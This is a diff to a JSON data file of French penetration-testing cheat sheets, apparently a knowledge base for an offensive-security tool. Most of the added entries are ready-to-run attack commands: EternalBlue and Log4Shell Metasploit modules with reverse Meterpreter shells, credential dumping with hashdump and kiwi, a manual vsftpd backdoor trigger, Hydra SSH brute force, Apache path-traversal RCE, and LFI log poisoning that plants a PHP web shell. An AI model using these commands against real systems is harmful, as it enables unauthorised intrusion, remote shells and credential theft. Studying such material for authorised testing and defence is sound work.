@@ -1,14 +1,38 @@
 {
   "texts": [
-    "# Exploitation FTP - Accès Anonyme\nSi le service FTP (port 21) autorise les connexions anonymes, il est possible d'énumérer les fichiers sensibles.\n\n## [1] Énumération\n```bash\nftp <target_ip>\n# Login: anonymous\n# Pass: <any>\nls -R\n```\n\n## [2] Exploitation\nTentez de télécharger des fichiers de configuration ou des sauvegardes (.sql, .ini, .log).\n```bash\nwget -r ftp://anonymous@<target_ip>/\n```\n\n## [3] Post-Exploitation\nAnalysez les fichiers pour trouver des identifiants ou des clés SSH.\n",
-    "# Bruteforce SSH (Port 22)\nSi une énumération d'utilisateurs a réussi, tentez un bruteforce avec Hydra.\n\n## [1] Énumération\nIdentifiez la version SSH.\n```bash\nnmap -sv <target_ip> -p 22\n```\n\n## [2] Exploitation\nUtilisez une liste d'utilisateurs courants (root, admin, user).\n```bash\nhydra -L users.txt -P passwords.txt <target_ip> ssh\n```\n\n## [3] Post-Exploitation\nUne fois connecté, vérifiez les privilèges sudo.\n```bash\nsudo -l\n```\n"
+    "# SMB & Windows Exploitation Cheat Sheet\n\n## MS17-010 (EternalBlue / CVE-2017-0144)\nVulnérabilité critique dans le protocole SMBv1 de Windows permettant l'exécution de code à distance avec les privilèges SYSTEM.\n\n### Détection / Audit\nScanner la cible avec Nmap pour confirmer la présence de la vulnérabilité :\n```bash\nnmap -p 445 --script smb-vuln-ms17-010 TARGET_IP\n```\n\n### Exploitation via Metasploit\nL'exploit classique pour obtenir un shell Meterpreter :\n```bash\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS TARGET_IP\nset LHOST YOUR_IP\nset LPORT 4444\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit\n```\n\n### Post-Exploitation\nUne fois le shell obtenu (en tant que NT AUTHORITY\\SYSTEM) :\n```bash\nhashdump\nload kiwi\ncreds_all\n```",
+    "## SMB Null Session / Guest Access\nMauvaise configuration permettant un accès non authentifié aux partages SMB.\n\n### Audit / Énumération\nLister les partages avec un utilisateur nul :\n```bash\nsmbclient -L //TARGET_IP/ -U \"\" -N\n```\nOu via enum4linux :\n```bash\nenum4linux -a TARGET_IP\n```\n\n### Exploitation\nSe connecter à un partage spécifique sans mot de passe :\n```bash\nsmbclient //TARGET_IP/sharename -U \"\" -N\n```",
+    "# FTP & SSH Brute Force / Exploitation Cheat Sheet\n\n## vsftpd 2.3.4 Backdoor (CVE-2011-2523)\nCette version spécifique de vsftpd contient une backdoor malveillante. Si l'utilisateur tape un nom d'utilisateur contenant un smiley `:)`, le port 6200 s'ouvre avec un shell root.\n\n### Détection / Audit\nVérifier la bannière du service :\n```bash\nnc -nv TARGET_IP 21\n```\n*(Attendu: \"220 (vsFTPd 2.3.4)\")*\n\n### Exploitation Manuelle\n```bash\n# Terminal 1 : Déclencher la backdoor\ntelnet TARGET_IP 21\nUSER backdoor:)\nPASS password\n\n# Terminal 2 : Se connecter au port 6200\nnc -nv TARGET_IP 6200\nid\n```\n\n### Exploitation via Metasploit\n```bash\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS TARGET_IP\nexploit\n```",
+    "## SSH Brute Force\nAttaque par dictionnaire sur le service SSH (port 22).\n\n### Audit\nVérifier si l'authentification par mot de passe est activée (et non seulement par clé publique) :\n```bash\nssh -o PreferredAuthentications=password dummyuser@TARGET_IP\n```\n\n### Exploitation via Hydra\nLancer une attaque de brute force avec un fichier de mots de passe :\n```bash\nhydra -l root -P /usr/share/wordlists/rockyou.txt TARGET_IP ssh\n```\n*(Note: Ajuster `-l` pour le nom d'utilisateur, ou utiliser `-L` pour une liste d'utilisateurs).*",
+    "## FTP Anonymous Login\nMauvaise configuration permettant de se connecter au serveur FTP sans identifiants valides.\n\n### Audit & Exploitation\n```bash\nftp TARGET_IP\nName: anonymous\nPassword: <Entrer n'importe quoi ou vide>\n```\nUne fois connecté, lister les fichiers :\n```bash\nls -la\nget fichier.txt\n```",
+    "# Web Exploitation Cheat Sheet\n\n## Apache HTTP Server 2.4.49/2.4.50 Path Traversal (CVE-2021-41773 / CVE-2021-42013)\nCette vulnérabilité permet d'accéder à des fichiers en dehors du répertoire racine web, voire d'exécuter des commandes (RCE) si le module `mod_cgi` est activé.\n\n### Détection / Audit\n```bash\ncurl -v --path-as-is http://TARGET_IP:PORT/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd\n```\n\n### Exploitation (RCE)\nSi `mod_cgi` est activé, exécution de commandes arbitraires :\n```bash\ncurl -s --path-as-is -d \"echo Content-Type: text/plain; echo; id\" \"http://TARGET_IP:PORT/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh\"\n```",
+    "## Log4Shell (CVE-2021-44228) sur Service Web\nVulnérabilité critique dans la bibliothèque Java Log4j permettant l'exécution de code à distance (RCE) via l'injection de requêtes JNDI.\n\n### Détection / Audit\nVérifier si les en-têtes HTTP ou les champs de saisie sont vulnérables en utilisant un serveur d'interaction (ex: interactsh) :\n```bash\ncurl -H 'User-Agent: ${jndi:ldap://YOUR_INTERACTSH_SERVER}' http://TARGET_IP:PORT/\n```\n\n### Exploitation via Metasploit\n```bash\nuse exploit/multi/http/log4shell_header_injection\nset RHOSTS TARGET_IP\nset RPORT TARGET_PORT\nset SRVHOST YOUR_IP\nset PAYLOAD java/meterpreter/reverse_tcp\nset LHOST YOUR_IP\nexploit\n```",
+    "## Local File Inclusion (LFI)\nFaille courante sur les applications web mal codées permettant de lire des fichiers locaux sur le serveur.\n\n### Audit\n```bash\ncurl \"http://TARGET_IP:PORT/index.php?page=../../../../etc/passwd\"\n```\n\n### Exploitation vers RCE (Log Poisoning)\nSi un LFI est présent, on peut tenter d'empoisonner les logs d'Apache (`/var/log/apache2/access.log`) :\n```bash\ncurl -H \"User-Agent: <?php system(\\$_GET['cmd']); ?>\" http://TARGET_IP:PORT/\ncurl \"http://TARGET_IP:PORT/index.php?page=../../../../var/log/apache2/access.log&cmd=id\"\n```"
   ],
   "metadata": [
     {
-      "source": "ftp_anon.md"
+      "source": "smb_windows.md"
     },
     {
-      "source": "ssh_brute.md"
+      "source": "smb_windows.md"
+    },
+    {
+      "source": "ssh_ftp_bruteforce.md"
+    },
+    {
+      "source": "ssh_ftp_bruteforce.md"
+    },
+    {
+      "source": "ssh_ftp_bruteforce.md"
+    },
+    {
+      "source": "web_exploitation.md"
+    },
+    {
+      "source": "web_exploitation.md"
+    },
+    {
+      "source": "web_exploitation.md"
     }
   ]
 }
